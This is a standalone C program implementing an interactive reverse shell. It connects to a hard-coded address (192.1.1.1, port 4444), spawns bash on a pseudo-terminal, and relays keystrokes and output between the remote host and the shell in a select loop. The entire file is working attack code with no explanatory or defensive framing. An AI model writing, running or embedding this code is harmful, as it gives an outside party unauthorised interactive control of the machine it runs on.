#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <unistd.h>



int main()  {
    char path[] = "/usr/bin/bash";
    char *arg[] = {"sh", NULL};
    int master_fd;
    int slave_fd;
    int server_socket;
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    char *ip = "192.1.1.1";
    struct sockaddr_in machine_device;
    machine_device.sin_family = AF_INET;
    machine_device.sin_port = htons(4444);
    machine_device.sin_addr.s_addr = inet_addr(ip);
    if (connect(server_socket, (struct sockaddr *) &machine_device, sizeof(machine_device)) == 0) {
        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) == 0) {
            pid_t pid = fork();
            if (pid == 0) {
                close(master_fd);
                setsid();
                ioctl(slave_fd, TIOCSCTTY, 0);
                dup2(slave_fd, STDIN_FILENO);
                dup2(slave_fd, STDOUT_FILENO);
                dup2(slave_fd, STDERR_FILENO);
                close(slave_fd);
                if (execve(path,arg,NULL) == -1) {
                    printf("Error in execve");
                    exit(EXIT_FAILURE);
                }
            }
            
            if (pid != 0) {
                    close(slave_fd);
                    fd_set read_fds, write_fds;
                    
                    int max_fd = (server_socket > master_fd) ? server_socket : master_fd;
                    char buffer[8096];
                    while (1) {
                    FD_ZERO(&read_fds);
                    FD_SET(server_socket, &read_fds);
                    FD_SET(master_fd, &read_fds);  
                    int fd_r = select(max_fd + 1, &read_fds, NULL, NULL, NULL);
                        if (fd_r == -1) {
                            perror("Error occured in descriptor assignment");
                            exit(EXIT_FAILURE);
                        }
                        else if (fd_r > 0)
                        {
                                if (FD_ISSET(server_socket, &read_fds)) {
                                        ssize_t bytesize_sock = read(server_socket, buffer, sizeof(buffer));
                                        if (bytesize_sock > 0) {
                                            ssize_t write_to_pty = write(master_fd, buffer, bytesize_sock);
                                            if (write_to_pty == -1) {
                                                perror("write to master_fd from sock_fd failed");
                                                exit(EXIT_FAILURE);
                                            }
                                        } else if(bytesize_sock == 0) {
                                            perror("Client disconnect on socket");
                                            exit(EXIT_FAILURE);
                                        } else if(bytesize_sock == -1) {
                                            perror("Error in reading data on socket");
                                            exit(EXIT_FAILURE);
                                        }
                                    
                                    }
                                if (FD_ISSET(master_fd, &read_fds)) {
                                    ssize_t bytesize_pty = read(master_fd, buffer, sizeof(buffer));
                                    if (bytesize_pty > 0) {
                                        ssize_t write_to_sock = write(server_socket, buffer, bytesize_pty);
                                        if (write_to_sock == -1) {
                                            perror("write to sock from master fd failed");
                                            exit(EXIT_FAILURE);
                                        }
                                    } else if(bytesize_pty == 0) {
                                        perror("error in bytesize of pty");
                                        exit(EXIT_FAILURE);
                                    } else if (bytesize_pty == -1) {
                                        perror("bytesize_pty returns -1");
                                        exit(EXIT_FAILURE);
                                    }
                                    }
                            }
                        }
                    }              
        }
        else {
            perror("PTYopen error, return value is not 0");
            exit(EXIT_FAILURE);
            }
    } else {
        perror("socket return value not 0, error");
        exit(EXIT_FAILURE);
    }
    return 0;
}
